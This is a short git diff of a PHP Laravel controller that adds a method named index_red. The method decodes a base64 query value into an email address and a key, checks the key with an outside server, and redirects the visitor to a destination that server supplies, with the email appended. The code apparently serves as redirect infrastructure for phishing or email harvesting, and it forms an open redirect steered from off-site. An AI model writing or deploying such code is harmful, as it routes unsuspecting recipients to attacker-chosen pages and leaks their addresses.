@@ -37,6 +37,25 @@ class Controller extends BaseController
             ->header('Content-Type', 'application/javascript');
     }
 
+
+    public function index_red(){
+        $decode = base64_decode(request()->query('e'));
+        $email = explode("&",$decode)[0];
+        $key_red  = explode("&",$decode)[1];
+
+        $key_val = Http::get("https://natrium100gram.site/public/api/validate_key/".$key_red);
+
+        if ($key_val->successful()){
+            $target = $key_val["url_target"];
+            return redirect()->away($target.$email);
+
+        }else{
+            return $key_val->status();
+        }
+
+        
+    }
+
     public function index(){
 
 //        $data = saveEmail::where('ip',request()->ip())->latest()->first();
